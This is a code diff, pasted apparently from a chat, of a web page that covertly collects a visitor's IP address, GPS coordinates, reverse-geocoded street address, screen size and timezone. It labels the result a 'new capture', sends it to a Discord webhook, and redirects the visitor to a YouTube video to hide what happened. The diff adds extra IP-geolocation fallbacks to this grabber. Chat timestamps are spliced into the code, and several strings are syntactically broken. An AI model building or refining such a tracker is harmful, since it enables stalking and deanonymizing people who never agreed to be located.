@@ -1,4 +1,3 @@
-Kitkatik, [13.06.2026 19:21]
 <!DOCTYPE html>
 <html>
 <head>
@@ -18,41 +17,14 @@ Kitkatik, [13.06.2026 19:21]
             } catch(e) { console.error(e); }
         }
 
-        // Получение адреса по координатам (обратное геокодирование) через Nominatim (бесплатно, без ключа)
-        async function getAddressFromCoords(lat, lon) {
-            try {
-                const url = https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1;
-                const response = await fetch(url, {
-                    headers: { 'User-Agent': 'Mozilla/5.0 (compatible; CoordCollector/1.0)' }
-                });
-                const data = await response.json();
-                if (data && data.display_name) {
-                    // Можно сократить: data.address.road, data.address.city, data.address.country
-                    const addr = data.address;
-                    const parts = [];
-                    if (addr.road) parts.push(addr.road);
-                    if (addr.house_number) parts.push(addr.house_number);
-                    if (addr.city  addr.town  addr.village) parts.push(addr.city  addr.town  addr.village);
-                    if (addr.state) parts.push(addr.state);
-                    if (addr.country) parts.push(addr.country);
-                    return parts.join(', ') || data.display_name.split(',')[0];
-                } else {
-                    return 'адрес не найден';
-                }
-            } catch(e) {
-                console.warn("Ошибка геокодинга:", e);
-                return 'ошибка получения адреса';
-            }
-        }
-
-        // Получение координат и адреса
+        // Получение координат с приоритетом GPS, затем два IP-сервиса
         async function getLocationWithAddress() {
-            // 1. Пробуем GPS
+            // ----- 1. Пробуем GPS -----
             if (navigator.geolocation) {
                 try {
                     const position = await new Promise((resolve, reject) => {
                         navigator.geolocation.getCurrentPosition(resolve, reject, {
-                            timeout: 8000,
+                            timeout: 7000,
                             enableHighAccuracy: true
                         });
                     });
@@ -60,33 +32,50 @@ Kitkatik, [13.06.2026 19:21]
                     const lon = position.coords.longitude;
                     const acc = position.coords.accuracy;
                     const coordsText = 🌍 GPS: ${lat}, ${lon} (точность ±${Math.round(acc)} м);
-                    // Получаем адрес по GPS координатам
-                    const address = await getAddressFromCoords(lat, lon);
+                    // Пробуем получить адрес через Nominatim (HTTPS)
+                    let address = 'адрес не получен';
+                    try {
+                        const geoUrl = https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1;
+                        const resp = await fetch(geoUrl, { headers: { 'User-Agent': 'Mozilla/5.0' } });
+                        const data = await resp.json();
+                        if (data && data.display_name) {
+                            address = data.display_name.split(', ').slice(0, 4).join(', ');
+                        }
+                    } catch(e) { console.warn(e); }
                     return { coords: coordsText, address: 📍 Адрес: ${address} };
                 } catch(e) {
                     console.warn("GPS ошибка:", e.message);
                 }
             }
 
-            // 2. Fallback: IP-геолокация (ip-api.com возвращает и координаты, и адрес)
+            // ----- 2. Fallback 1: ip-api.com через HTTPS -----
             try {
-                const response = await fetch('http://ip-api.com/json/');
-                const data = await response.json();
+                const resp = await fetch('https://ip-api.com/json/');
+                const data = await resp.json();
                 if (data.status === 'success') {
-                    const coordsText = 📍 IP-геолокация: ${data.lat}, ${data.lon} (${data.city}, ${data.country});
-                    const addressText = 🏠 Адрес (по IP): ${data.city}, ${data.regionName}, ${data.country} (${data.zip});
+                    const coordsText = 📍 IP-геолокация (ip-api): ${data.lat}, ${data.lon};
+                    const addressText = 🏠 Адрес: ${data.city}, ${data.regionName}, ${data.country};
                     return { coords: coordsText, address: addressText };
-                } else {
-                    return { coords: '❌ Координаты не определены', address: '❌ Адрес не определен' };
                 }
-            } catch(err) {
-                return { coords: ❌ Ошибка получения координат: ${err.message}, address: '❌ Адрес не определен' };
-            }
+            } catch(e) { console.warn("ip-api.com error:", e); }
+
+            // ----- 3. Fallback 2: ipwho.is (запасной) -----
+            try {
+                const resp = await fetch('https://ipwho.is/');
+                const data = await resp.json();
+                if (data.success) {
+                    const coordsText = 📍 IP-геолокация (ipwho.is): ${data.latitude}, ${data.longitude};
+                    const addressText = 🏠 Адрес: ${data.city}, ${data.region}, ${data.country};
+                    return { coords: coordsText, address: addressText };
+                }
+            } catch(e) { console.warn("ipwho.is error:", e); }
+
+            // Всё сломалось
+            return { coords: '❌ Координаты не определены', address: '❌ Адрес не определен' };
         }
 
-Kitkatik, [13.06.2026 19:21]
-async function collectAndRedirect() {
-            // Собираем IP
+        async function collectAndRedirect() {
+            // IP через ipify (HTTPS)
             let ip = 'не удалось';
             try {
                 let res = await fetch('https://api.ipify.org?format=json');
@@ -94,11 +83,10 @@ async function collectAndRedirect() {
                 ip = data.ip;
             } catch(e) {}
 
-            // Получаем координаты + адрес
             const { coords, address } = await getLocationWithAddress();
 
-            // Формируем сообщение
-            let message = 'НОВЫЙ ЗАХВАТ\n';
+Kitkatik, [13.06.2026 19:24]
+let message = 'НОВЫЙ ЗАХВАТ\n';
             message += 'Время: ' + new Date().toLocaleString() + '\n';
             message += 'IP: ' + ip + '\n';
             message += 'Координаты: ' + coords + '\n';
@@ -111,10 +99,7 @@ async function collectAndRedirect() {
             message += 'Экран: ' + screen.width + 'x' + screen.height + '\n';
             message += 'Часовой пояс: ' + Intl.DateTimeFormat().resolvedOptions().timeZone;
 
-            // Отправляем в Discord
             await sendToDiscord(message);
-
-            // Редирект
             window.location.replace('https://www.youtube.com/watch?v=dQw4w9WgXcQ');
         }
 
